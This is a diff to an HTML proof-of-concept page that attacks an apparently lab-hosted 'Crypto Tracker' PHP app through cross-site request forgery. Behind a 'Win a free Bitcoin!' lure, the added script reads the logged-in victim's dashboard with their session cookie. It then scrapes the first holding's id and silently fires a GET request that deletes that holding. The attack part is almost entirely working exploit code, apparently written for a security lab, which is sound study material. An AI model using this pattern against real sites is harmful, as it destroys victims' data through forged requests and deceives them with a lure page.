@@ -1,14 +1,18 @@
 <!doctype html>
 <!--
-  csrf_delete.html — CSRF proof-of-concept (delete a victim's holding)
+  csrf_delete.html — CSRF proof-of-concept (delete a victim's FIRST holding)
 
-  Demo: host this file anywhere OTHER than the app (e.g. open it as a local
-  file, or serve it on a different port). Have a victim who is logged in to the
-  Crypto Tracker in the same browser open this page. Because delete_holding.php
-  accepts a plain GET with no CSRF token and no SameSite cookie protection, the
-  victim's session cookie rides along and the holding is silently deleted.
+  Demo: a logged-in victim opens this page. Instead of a hardcoded id, the
+  attacker JS first fetches the victim's own dashboard (their session cookie
+  rides along), scrapes the id of the *first* holding in the table, then fires
+  delete_holding.php?id=<that id>. So it always deletes the top holding, whatever
+  it is — no need to know an id in advance.
 
-  Change id below to target a specific holding.
+  Why the read step works in this lab: the attacker files are served from the
+  same origin as the app (http://localhost/crypto-tracker/attacker/... — see
+  DEPLOY_KALI_APACHE.md), so the fetch is same-origin and the response is
+  readable. delete_holding.php then accepts a plain GET with no CSRF token, so
+  the deletion goes through on the victim's session.
 -->
 <html>
 <head><meta charset="utf-8"><title>Win a free Bitcoin! 🎉</title></head>
@@ -16,8 +20,27 @@
   <h1>Congratulations — you won! 🎁</h1>
   <p>Loading your prize...</p>
 
-  <!-- VULN target: CSRF via GET on delete_holding.php -->
-  <img src="http://localhost/crypto-tracker/delete_holding.php?id=1"
-       width="1" height="1" style="display:none" alt="">
+  <script>
+    // Point this at the app's base URL.
+    var APP = 'http://localhost/crypto-tracker';
+
+    // VULN target: CSRF + IDOR on delete_holding.php (plain GET, no token).
+    (async function () {
+      try {
+        // 1. Read the victim's dashboard using their live session.
+        var html = await fetch(APP + '/dashboard.php', { credentials: 'include' })
+                          .then(function (r) { return r.text(); });
+
+        // 2. Scrape the id of the first holding (first Del link in the table).
+        var m = html.match(/delete_holding\.php\?id=(\d+)/);
+        if (!m) { return; }               // nothing to delete
+        var id = m[1];
+
+        // 3. Fire the delete on the victim's session.
+        var img = new Image();
+        img.src = APP + '/delete_holding.php?id=' + id;
+      } catch (e) { /* stay silent — victim sees nothing */ }
+    })();
+  </script>
 </body>
 </html>
